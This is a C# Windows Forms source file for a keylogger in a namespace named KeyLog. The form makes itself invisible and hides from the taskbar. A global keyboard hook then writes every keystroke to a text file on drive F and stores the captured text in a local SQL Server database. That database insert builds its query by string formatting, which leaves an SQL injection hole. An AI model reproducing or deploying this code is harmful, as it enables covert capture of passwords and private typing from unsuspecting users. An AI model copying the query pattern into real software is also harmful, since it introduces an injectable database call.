﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Sql;
using System.Data.SqlClient;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using Utilities;


namespace KeyLog
{
    public partial class Form1 : Form
    {
        String s = "";
        String k = "";
        String t = "";
        int a = 0;
        int C = 20;
        public Form1()
        {
            InitializeComponent();
           // this.WindowState = FormWindowState.Maximized;
            this.ShowInTaskbar = false;
            this.Opacity = 0;
        }
        globalKeyboardHook gkh = new globalKeyboardHook();
        private void HookAll()
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys)key);
            }
        }

        /*private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {
            //listBox1.Items.Add(e.KeyChar);
           // StreamWriter sw = new StreamWriter(@"G:\key.txt", true);
           // sw.Write(e.KeyChar);
            s = s + e.KeyChar;
            k = e.KeyChar.ToString();
           // sw.Close();
            if (k.Equals(" "))
            {
                try
                {
                    SqlConnection cn = new SqlConnection("server=Localhost;initial catalog=Practice;trusted_connection=true");
                    cn.Open();
                    string query = string.Format("insert into [Practice].[dbo].[key] values('{0}')", s);        
                    SqlCommand cmd = new SqlCommand(query, cn);
                    cmd.ExecuteNonQuery();
                    cn.Close();
                    s = "";
                }
                catch (Exception e1)
                {
                    MessageBox.Show(e1.ToString());
                }

            }
        }*/

        private void Form1_Load(object sender, EventArgs e)
        {
            gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
            HookAll();
            /*if (File.Exists(@"Keylogger.txt"))
            {
                File.Delete(@"Keylogger.txt");
            }*/
        }

        void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
        {
            
            string y = e.KeyCode.ToString();
            // char p = (char)e.KeyCode;
            //  KeyPressEventArgs e1 = new KeyPressEventArgs(p);
            StreamWriter SW = new StreamWriter(@"F:\key.txt", true);
            
            switch (e.KeyCode)
            {
                case Keys.Space:
                    SW.Write(" ");
                    y = "";
                    break;

                case Keys.D0:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write(")");
                        y = ")";
                    }
                    else { SW.Write("0");
                        y = "0";
                    }
                    break;

                case Keys.D1:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("!");
                        y = "!";
                    }
                    else
                    {
                        SW.Write("1");
                        y = "1";
                    }
                    break;

                case Keys.D2:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("@");
                        y = "@";
                    }
                    else
                    {
                        SW.Write("2");
                        y = "2";
                    }
                    break;

                case Keys.D3:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("#");
                        y = "#";
                    }
                    else
                    {
                        SW.Write("3");
                        y = "3";
                    }
                    break;

                case Keys.D4:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("$");
                        y = "$";
                    }
                    else
                    {
                        SW.Write("4");
                        y = "4";
                    }
                    break;

                case Keys.D5:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("%");
                        y = "%";
                    }
                    else
                    {
                        SW.Write("5");
                        y = "5";
                    }
                    break;

                case Keys.D6:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("^");
                        y = "^";
                    }
                    else
                    {
                        SW.Write("6");
                        y = "6";
                    }
                    break;

                case Keys.D7:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("&");
                        y = "&";
                    }
                    else
                    {
                        SW.Write("7");
                        y = "7";
                    }
                    break;

                case Keys.D8:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("*");
                        y = "*";
                    }
                    else
                    {
                        SW.Write("8");
                        y = "8";
                    }
                    break;

                case Keys.D9:
                    if (Keyboard.IsKeyDown(Key.LeftShift) == true)
                    {
                        SW.Write("(");
                        y = "(";
                    }
                    else
                    {
                        SW.Write("9");
                        y = "9";
                    }
                    break;

                case Keys.Capital:
                    SW.Write("");
                    y = "";
                    break;
                case Keys.OemPeriod:
                    SW.Write(".");
                    y = ".";
                    break;
                case Keys.Oem7:
                    SW.Write("'");
                    break;

                case Keys.Oemcomma:
                    SW.Write(",");
                    break;

                case Keys.Enter:
                    SW.Write(Environment.NewLine);
                    y = " ";
                    break;


                case Keys.LShiftKey:
                    SW.Write("");
                    y = "";
                    break;

                case Keys.RShiftKey:
                    SW.Write("");
                    y = "";
                    break;
                case Keys.OemQuestion:
                    SW.Write("?");
                    y = "?";
                    break;

                case Keys.LControlKey:
                    SW.Write("");
                    y = "";
                    break;

                case Keys.RControlKey:
                    SW.Write("");
                    y = "";
                    break;

                case Keys.LMenu:
                    SW.Write("");
                    y = "";
                    break;

                case Keys.Tab:
                    SW.Write("");
                    y = "";
                    break;

                case Keys.Escape:
                    SW.Write("");
                    y = "";
                    break;

                case Keys.F1 | Keys.F2 | Keys.F3 | Keys.F4 | Keys.F5 | Keys.F6 | Keys.F7 | Keys.F8 | Keys.F9 | Keys.F10 | Keys.F11 | Keys.F12:
                    SW.Write("");
                    y = "";
                    break;

                case Keys.RMenu:
                    SW.Write("");
                    y = "";
                    break;

                default:
                    if (Control.ModifierKeys != Keys.Shift)
                        SW.Write(y.ToLower());
                    else
                        SW.Write(y);
                    break;
            }
            //SW.Write(y.ToLower());
            
            s = s + y;
            k = e.KeyCode.ToString();
            SW.Close();
            if (y.Equals(" "))
            {
                try
                {
                    SqlConnection cn = new SqlConnection("server=Localhost;initial catalog=Practice;trusted_connection=true");
                    cn.Open();
                    s = s +" "+ DateTime.Today;
                    string query = string.Format("insert into [Practice].[dbo].[key] values('{0}')", s);
                    SqlCommand cmd = new SqlCommand(query, cn);
                    cmd.ExecuteNonQuery();
                    cn.Close();
                    s = "";
                    y = "";
                }
                catch (Exception e1)
                {
                    MessageBox.Show(e1.ToString());
                }


            }

           

        }
    }
}
